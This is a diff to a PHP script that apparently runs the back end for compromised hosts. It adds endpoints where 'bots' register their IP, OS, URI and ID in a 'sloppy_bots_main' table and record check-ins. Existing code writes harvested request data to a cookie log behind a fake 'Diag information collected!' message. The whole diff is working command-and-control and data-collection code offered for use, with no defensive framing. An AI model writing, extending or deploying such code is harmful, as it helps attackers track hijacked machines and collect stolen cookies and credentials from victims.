@@ -12,26 +12,45 @@ function fresh_deploy(){
         if (empty(fread($fp, 1))){
             $rRun = new postgres_checker();
             if ($rRun->checkDB() != false){
-                echo("DB is running, executing a create db function.");
                 if ($rRun->createDB() != false) {
                     fwrite($fp, "running");
                     fclose($fp);
-                }else{
-                    echo("CRITICAL, I CANNOT CONTINUE, THE DB WAS NOT CREATED, ANY NEW HOSTS WILL NOT BE SAVED.");
+                    return true;
                 }
+            }else{
+                return true;
             }
 
         }
     }catch (Exception $ee){
-
+        return false;
     }
 }
 
-function addNewHost($rhost, $uri, $action){
-    if (!empty($rhost) && !empty($uri) && !empty($action)){
-        if (strtolower($action) === 'add') {
-            $prep = sprintf("INSERT INTO sloppy_bots(host, uri) VALUES ('%s', '%s')", pg_escape_string($rhost), pg_escape_string($uri));
+function addNewHost($rhost, $uri, $action, $uid, $os){
+    if (!empty($rhost) && !empty($uri) && !empty($action) && !empty($os) && !empty($uid)){
+        $ipu = sprintf("SELECT host,check_in FROM sloppy_bots_main WHERE host like '%s'",
+            pg_escape_string($rhost)
+        );
+        $doEx = pg_exec(DBCONN, $ipu);
+        $row = pg_fetch_row($doEx);
+        if (strtolower($action) === 'add' && is_null($row)) {
+            $prep = sprintf("INSERT INTO sloppy_bots_main(host, os, uri, uid) VALUES ('%s', '%s', '%s', '%s')",
+                pg_escape_string($rhost),
+                pg_escape_string($os),
+                pg_escape_string($uri),
+                pg_escape_string($uid)
+            );
             pg_exec(DBCONN, $prep);
+            http_response_code("200");
+        }elseif(strtolower($action) === "ci"){
+            $pe = sprintf("UPDATE sloppy_bots_main SET check_in = '%s' WHERE host = '%s'",
+                $row[1] + 1,
+                pg_escape_string($rhost)
+            );
+            pg_exec(DBCONN, $pe);
+            http_response_code("200");
+
         }else{
             http_response_code('444');
         }
@@ -45,6 +64,7 @@ if (!file_exists(sys_get_temp_dir()."diag_php.pid")){
 
 
 if (!empty($_SERVER["REQUEST_METHOD"])) {
+
     $outLog = './lots/cookie.log';
     echo "Diag information collected!";
     header("Access-Control-Allow-Origin: *");
@@ -62,6 +82,13 @@ if (!empty($_SERVER["REQUEST_METHOD"])) {
             $req_dump = print_r($req, true);
             $fp = file_put_contents($outLog, "HOST: ".$_SERVER["REMOTE_ADDR"]."\nContents: ".$req_dump."\n", FILE_APPEND);
             http_response_code(200);
+        }
+    }
+    if ($_SERVER["REQUEST_METHOD"] === "POST"){
+        if (strtolower($_POST["ac"]) === "add" && isset($_POST["iru"]) && isset($_POST["u"]) && isset($_POST['o'])){
+            addNewHost($_SERVER["REMOTE_ADDR"], $_POST["iru"], "add", $_POST["u"], $_POST['o']);
+        }elseif (strtolower($_POST["ac"]) === "ci"){
+            addNewHost($_SERVER["REMOTE_ADDR"], '-', $_POST['ac'], '-', '-');
         }
     }
 }
